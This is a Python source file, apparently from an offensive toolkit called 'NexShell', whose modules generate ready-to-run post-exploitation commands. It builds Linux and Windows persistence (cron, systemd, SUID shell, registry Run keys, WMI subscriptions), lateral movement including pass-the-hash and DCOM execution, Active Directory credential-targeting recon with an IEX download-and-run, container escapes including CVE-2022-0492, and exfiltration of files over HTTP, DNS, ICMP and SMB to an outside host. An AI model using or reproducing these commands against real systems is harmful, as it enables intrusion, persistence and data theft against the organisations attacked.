#!/usr/bin/env python3
"""
NexShell — Operational Modules
Professional post-exploitation modules: persistence, lateral movement,
C2 staging, AD recon, container escape, data exfiltration.
"""


# ══════════════════════════════════════════════════════════════════════════════
#  MODULE: PERSISTENCE
# ══════════════════════════════════════════════════════════════════════════════

class PersistenceModule:
    """Cross-platform persistence mechanisms."""

    # ── Linux ─────────────────────────────────────────────────────────────────
    @staticmethod
    def linux_crontab(cmd: str, interval: str = '*/5 * * * *') -> str:
        return f"(crontab -l 2>/dev/null; echo '{interval} {cmd}') | crontab -"

    @staticmethod
    def linux_bashrc(cmd: str) -> str:
        return f"echo '{cmd}' >> ~/.bashrc"

    @staticmethod
    def linux_systemd(name: str, cmd: str, host: str, port: int) -> str:
        return (
            f"cat > /tmp/{name}.service << 'EOF'\n"
            f"[Unit]\nDescription={name}\nAfter=network.target\n\n"
            f"[Service]\nType=simple\nRestart=always\nRestartSec=30\n"
            f"ExecStart={cmd}\n\n"
            f"[Install]\nWantedBy=multi-user.target\nEOF\n"
            f"sudo mv /tmp/{name}.service /etc/systemd/system/\n"
            f"sudo systemctl daemon-reload\n"
            f"sudo systemctl enable {name}\n"
            f"sudo systemctl start {name}"
        )

    @staticmethod
    def linux_authorized_keys(pubkey: str) -> str:
        return (
            "mkdir -p ~/.ssh && chmod 700 ~/.ssh && "
            f"echo '{pubkey}' >> ~/.ssh/authorized_keys && "
            "chmod 600 ~/.ssh/authorized_keys"
        )

    @staticmethod
    def linux_suid_shell() -> str:
        return "cp /bin/bash /tmp/.nxsh && chmod 4755 /tmp/.nxsh && /tmp/.nxsh -p"

    @staticmethod
    def linux_rc_local(cmd: str) -> str:
        return (
            f"echo '{cmd}' >> /etc/rc.local && chmod +x /etc/rc.local"
        )

    @staticmethod
    def linux_ld_preload(so_path: str) -> str:
        return f"echo '{so_path}' >> /etc/ld.so.preload"

    # ── Windows ───────────────────────────────────────────────────────────────
    @staticmethod
    def windows_registry_run(name: str, payload: str) -> str:
        return (
            f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run '
            f'/v "{name}" /t REG_SZ /d "{payload}" /f'
        )

    @staticmethod
    def windows_registry_run_once(name: str, payload: str) -> str:
        return (
            f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce '
            f'/v "{name}" /t REG_SZ /d "{payload}" /f'
        )

    @staticmethod
    def windows_schtask(name: str, payload: str, trigger: str = 'ONLOGON') -> str:
        return (
            f'schtasks /create /tn "{name}" /tr "{payload}" '
            f'/sc {trigger} /ru SYSTEM /f'
        )

    @staticmethod
    def windows_startup_folder(payload_name: str) -> str:
        return (
            f'copy payload.bat '
            f'"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{payload_name}.bat"'
        )

    @staticmethod
    def windows_wmi_subscription(name: str, payload: str) -> str:
        return (
            f"$filter = ([wmiclass]'root\\subscription:__EventFilter').CreateInstance();"
            f"$filter.Name = '{name}';"
            f"$filter.QueryLanguage = 'WQL';"
            f"$filter.Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\";"
            f"$filter.Put();"
            f"$consumer = ([wmiclass]'root\\subscription:CommandLineEventConsumer').CreateInstance();"
            f"$consumer.Name = '{name}';"
            f"$consumer.CommandLineTemplate = '{payload}';"
            f"$consumer.Put();"
            f"$binding = ([wmiclass]'root\\subscription:__FilterToConsumerBinding').CreateInstance();"
            f"$binding.Filter = $filter.Path;\n$binding.Consumer = $consumer.Path;\n$binding.Put()"
        )

    @classmethod
    def all_linux(cls, cmd: str) -> list:
        return [
            ('crontab',         cls.linux_crontab(cmd)),
            ('~/.bashrc',       cls.linux_bashrc(cmd)),
            ('SUID bash',       cls.linux_suid_shell()),
            ('authorized_keys', '# Add your public key via: linux_authorized_keys("<pubkey>")'),
        ]

    @classmethod
    def all_windows(cls, payload: str, name: str = 'NxSvc') -> list:
        return [
            ('HKCU Run key',       cls.windows_registry_run(name, payload)),
            ('Startup folder',     cls.windows_startup_folder(name)),
            ('Scheduled task',     cls.windows_schtask(name, payload)),
            ('WMI subscription',   cls.windows_wmi_subscription(name, payload)),
        ]


# ══════════════════════════════════════════════════════════════════════════════
#  MODULE: LATERAL MOVEMENT
# ══════════════════════════════════════════════════════════════════════════════

class LateralMovement:
    """Lateral movement techniques — Linux and Windows."""

    # ── Linux ─────────────────────────────────────────────────────────────────
    @staticmethod
    def ssh_hop(user: str, target: str, key: str = None) -> str:
        key_arg = f"-i {key}" if key else ""
        return f"ssh {key_arg} -o StrictHostKeyChecking=no {user}@{target}"

    @staticmethod
    def ssh_agent_hijack(sock_path: str) -> str:
        return (
            f"export SSH_AUTH_SOCK={sock_path}; "
            "ssh-add -l 2>/dev/null && "
            "ssh -o StrictHostKeyChecking=no $(hostname)"
        )

    @staticmethod
    def psexec_equivalent(target: str, user: str, password: str, cmd: str) -> str:
        return (
            f"smbclient //{target}/ADMIN$ -U '{user}%{password}' -c "
            f"'put /tmp/payload.exe payload.exe' && "
            f"winexe -U '{user}%{password}' //{target} '{cmd}'"
        )

    @staticmethod
    def docker_escape_socket() -> str:
        return (
            "docker -H unix:///var/run/docker.sock run -it "
            "--privileged --pid=host debian nsenter -t 1 -m -u -n -i sh"
        )

    @staticmethod
    def docker_escape_volume() -> str:
        return (
            "docker run -it -v /:/host debian chroot /host /bin/bash"
        )

    @staticmethod
    def lxd_escape() -> str:
        return (
            "lxc init ubuntu:18.04 privesc -c security.privileged=true; "
            "lxc config device add privesc mydevice disk source=/ path=/mnt/root recursive=true; "
            "lxc start privesc; "
            "lxc exec privesc /bin/sh"
        )

    @staticmethod
    def nfs_mount_exploit(server: str, share: str) -> str:
        return (
            f"showmount -e {server}; "
            f"mkdir /tmp/nfsmount; "
            f"mount -t nfs {server}:{share} /tmp/nfsmount -o nolock; "
            "ls -la /tmp/nfsmount"
        )

    # ── Windows ───────────────────────────────────────────────────────────────
    @staticmethod
    def psexec_windows(target: str, domain: str, user: str, password: str) -> str:
        return (
            f"Invoke-Command -ComputerName {target} -Credential "
            f"(New-Object PSCredential('{domain}\\{user}',"
            f"(ConvertTo-SecureString '{password}' -AsPlainText -Force))) "
            f"-ScriptBlock {{whoami}}"
        )

    @staticmethod
    def wmiexec_windows(target: str, user: str, password: str, cmd: str) -> str:
        return (
            f"$wmi = [wmiclass]\"\\\\{target}\\root\\cimv2:Win32_Process\";"
            f"$wmi.Create('{cmd}')"
        )

    @staticmethod
    def dcom_exec(target: str, cmd: str) -> str:
        return (
            f"$com = [activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application','{target}'));"
            f"$com.Document.ActiveView.ExecuteShellCommand(\"cmd.exe\",$null,'/c {cmd}','7')"
        )

    @staticmethod
    def pass_the_hash(target: str, user: str, ntlm_hash: str) -> str:
        return (
            f"Invoke-WMIMethod -ComputerName {target} -Class Win32_Process "
            f"-Name Create -ArgumentList 'cmd.exe /c whoami > C:\\result.txt' "
            f"-Credential (Get-Credential)"
            f"\n# or via impacket:\n"
            f"python3 wmiexec.py -hashes :{ntlm_hash} {user}@{target}"
        )

    @staticmethod
    def smb_scan(subnet: str) -> str:
        return (
            f"1..254 | ForEach-Object {{"
            f"$ip = '{subnet}.' + $_;"
            "Test-Connection -ComputerName $ip -Count 1 -Quiet | "
            "Where-Object {$_} | ForEach-Object {Write-Host $ip}}"
        )


# ══════════════════════════════════════════════════════════════════════════════
#  MODULE: ACTIVE DIRECTORY RECON
# ══════════════════════════════════════════════════════════════════════════════

class ADRecon:
    """Active Directory enumeration — all in PowerShell (no tools needed)."""

    @staticmethod
    def domain_info() -> str:
        return (
            "[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain() | "
            "Select Name,DomainControllers,DomainMode,Parent,Children"
        )

    @staticmethod
    def list_users() -> str:
        return (
            "$searcher = New-Object DirectoryServices.DirectorySearcher;"
            "$searcher.Filter = '(&(objectClass=user)(objectCategory=person))';"
            "$searcher.PageSize = 1000;"
            "$searcher.FindAll() | ForEach-Object {"
            "$_.Properties['samaccountname'],'|',"
            "$_.Properties['description'],'|',"
            "$_.Properties['memberof'] | Select-Object -First 1"
            "} | Select-Object -First 100"
        )

    @staticmethod
    def list_admins() -> str:
        return (
            "$searcher = New-Object DirectoryServices.DirectorySearcher;"
            "$searcher.Filter = '(&(objectClass=user)(adminCount=1))';"
            "$searcher.FindAll() | ForEach-Object {"
            "Write-Host $_.Properties['samaccountname']}"
        )

    @staticmethod
    def list_dcs() -> str:
        return (
            "[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()"
            ".DomainControllers | Select Name,IPAddress,OSVersion"
        )

    @staticmethod
    def spn_scan() -> str:
        """Kerberoastable accounts (SPNs)."""
        return (
            "$searcher = New-Object DirectoryServices.DirectorySearcher;"
            "$searcher.Filter = '(&(objectClass=user)(servicePrincipalName=*)(!samaccountname=krbtgt))';"
            "$searcher.FindAll() | ForEach-Object {"
            "Write-Host $_.Properties['samaccountname'] '→' $_.Properties['serviceprincipalname']}"
        )

    @staticmethod
    def asreproast() -> str:
        """ASREPRoastable accounts (no preauth required)."""
        return (
            "$searcher = New-Object DirectoryServices.DirectorySearcher;"
            "$searcher.Filter = '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))';"
            "$searcher.FindAll() | ForEach-Object {"
            "Write-Host '[!] ASREPRoastable:' $_.Properties['samaccountname']}"
        )

    @staticmethod
    def find_delegation() -> str:
        """Unconstrained/constrained delegation."""
        return (
            "$searcher = New-Object DirectoryServices.DirectorySearcher;"
            "$searcher.Filter = '(|(userAccountControl:1.2.840.113556.1.4.803:=524288)"
            "(userAccountControl:1.2.840.113556.1.4.803:=16777216))';"
            "$searcher.FindAll() | ForEach-Object {"
            "Write-Host '[!] Delegation:' $_.Properties['samaccountname'] '|' $_.Properties['dnshostname']}"
        )

    @staticmethod
    def bloodhound_collection() -> str:
        """SharpHound-style data collection via PowerShell."""
        return (
            "IEX(New-Object Net.WebClient).DownloadString("
            "'https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1');"
            "Invoke-BloodHound -CollectionMethod All -Domain (gwmi Win32_ComputerSystem).Domain"
        )

    @staticmethod
    def laps_passwords() -> str:
        """Read LAPS managed passwords."""
        return (
            "Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd | "
            "Where-Object {$_.'ms-Mcs-AdmPwd' -ne $null} | "
            "Select Name,'ms-Mcs-AdmPwd'"
        )


# ══════════════════════════════════════════════════════════════════════════════
#  MODULE: DATA EXFILTRATION
# ══════════════════════════════════════════════════════════════════════════════

class DataExfil:
    """Covert data exfiltration techniques."""

    @staticmethod
    def http_get_params(data: str, url: str) -> str:
        import base64 as b64
        encoded = b64.b64encode(data.encode()).decode()
        return f"curl -s '{url}?d={encoded}' > /dev/null"

    @staticmethod
    def dns_exfil(data: str, domain: str) -> str:
        return (
            f"data=$(echo '{data}'|base64|tr -d '='|tr '+/' '-_');"
            f"echo $data|fold -w 60|while read chunk; do nslookup $chunk.$domain; done"
        )

    @staticmethod
    def icmp_exfil(data: str, host: str) -> str:
        return f"ping -c 1 -p $(echo '{data}'|xxd -p|head -c 16) {host}"

    @staticmethod
    def linux_http_exfil(file: str, host: str, port: int) -> str:
        return (
            f"curl -s -X POST http://{host}:{port}/upload "
            f"-F 'file=@{file}' > /dev/null 2>&1"
        )

    @staticmethod
    def windows_https_exfil(file: str, host: str, port: int) -> str:
        return (
            f"$bytes=[System.IO.File]::ReadAllBytes('{file}');"
            f"$b64=[Convert]::ToBase64String($bytes);"
            f"Invoke-WebRequest -Uri 'https://{host}:{port}/upload' "
            f"-Method POST -Body $b64 -UseBasicParsing"
        )

    @staticmethod
    def smb_exfil(file: str, target: str, share: str) -> str:
        return f"copy {file} \\\\{target}\\{share}\\loot\\"

    @staticmethod
    def certutil_encode(file: str) -> str:
        return f"certutil -encode {file} {file}.b64 && type {file}.b64"


# ══════════════════════════════════════════════════════════════════════════════
#  MODULE: CONTAINER ESCAPE
# ══════════════════════════════════════════════════════════════════════════════

class ContainerEscape:
    """Container escape techniques."""

    @staticmethod
    def check_environment() -> str:
        return (
            "cat /proc/1/cgroup | head -5;"
            "ls /.dockerenv 2>/dev/null && echo '[Docker]';"
            "ls /run/.containerenv 2>/dev/null && echo '[Podman]';"
            "systemd-detect-virt 2>/dev/null;"
            "cat /proc/self/status | grep -i 'seccomp\\|cap'"
        )

    @staticmethod
    def privileged_container_escape() -> str:
        return (
            "# Check if privileged\n"
            "cat /proc/self/status | grep CapEff\n"
            "# If CapEff is ffffffffffffffff:\n"
            "mkdir /mnt/host\n"
            "mount /dev/sda1 /mnt/host 2>/dev/null || mount $(df|grep -v tmpfs|tail -1|awk '{print $1}') /mnt/host\n"
            "chroot /mnt/host /bin/bash"
        )

    @staticmethod
    def docker_socket_escape() -> str:
        return (
            "docker -H unix:///var/run/docker.sock ps 2>/dev/null && "
            "docker -H unix:///var/run/docker.sock run -it "
            "--privileged --pid=host --net=host "
            "-v /:/host alpine chroot /host sh"
        )

    @staticmethod
    def cgroups_v1_escape() -> str:
        return (
            "# CVE-2022-0492 cgroups v1 escape\n"
            "mkdir /tmp/cgroup && mount -t cgroup -o rdma cgroup /tmp/cgroup\n"
            "mkdir /tmp/cgroup/x && echo 1 > /tmp/cgroup/x/notify_on_release\n"
            "echo '#!/bin/sh\\ncp /bin/bash /tmp/0xdf && chmod 4755 /tmp/0xdf' > /tmp/escape.sh\n"
            "chmod +x /tmp/escape.sh\n"
            "echo /tmp/escape.sh > /tmp/cgroup/release_agent\n"
            "echo 0 > /tmp/cgroup/x/cgroup.procs\n"
            "/tmp/0xdf -p"
        )

    @staticmethod
    def kubernetes_service_account() -> str:
        return (
            "# Read service account token and CA\n"
            "TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\n"
            "CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt\n"
            "APISERVER=https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}\n"
            "# Enumerate\n"
            "curl -s --cacert $CACERT -H \"Authorization: Bearer $TOKEN\" "
            "$APISERVER/api/v1/namespaces/default/pods\n"
            "# Try to exec into another pod\n"
            "kubectl exec -it $(kubectl get pods -o name|head -1) -- sh"
        )


# ══════════════════════════════════════════════════════════════════════════════
#  MODULE REGISTRY — all modules callable from MainMenu
# ══════════════════════════════════════════════════════════════════════════════

MODULE_REGISTRY = {
    # Linux recon
    'quickenum':     {'desc': 'Fast Linux system enumeration',           'os': 'linux',   'type': 'recon'},
    'privesc':       {'desc': 'Linux PrivEsc advisor (SUID/GTFOBins)',   'os': 'linux',   'type': 'privesc'},
    'credharvest':   {'desc': 'Linux credential harvester',              'os': 'linux',   'type': 'creds'},
    # Windows recon
    'win-enum':      {'desc': 'Windows system enumeration',              'os': 'windows', 'type': 'recon'},
    'win-privesc':   {'desc': 'Windows PrivEsc advisor',                 'os': 'windows', 'type': 'privesc'},
    'win-creds':     {'desc': 'Windows credential harvester',            'os': 'windows', 'type': 'creds'},
    # Active Directory
    'ad-recon':      {'desc': 'AD enumeration (no tools needed)',        'os': 'windows', 'type': 'ad'},
    'ad-kerberoast': {'desc': 'Find Kerberoastable SPNs',                'os': 'windows', 'type': 'ad'},
    'ad-asreproast': {'desc': 'Find ASREPRoastable accounts',            'os': 'windows', 'type': 'ad'},
    # Persistence
    'persist-linux': {'desc': 'Linux persistence mechanisms',            'os': 'linux',   'type': 'persist'},
    'persist-win':   {'desc': 'Windows persistence mechanisms',          'os': 'windows', 'type': 'persist'},
    # Lateral movement
    'lateral':       {'desc': 'Lateral movement commands',               'os': 'both',    'type': 'lateral'},
    # Container escape
    'container':     {'desc': 'Container escape (Docker/K8s)',           'os': 'linux',   'type': 'escape'},
    # Exfiltration
    'exfil':         {'desc': 'Data exfiltration techniques',            'os': 'both',    'type': 'exfil'},
}
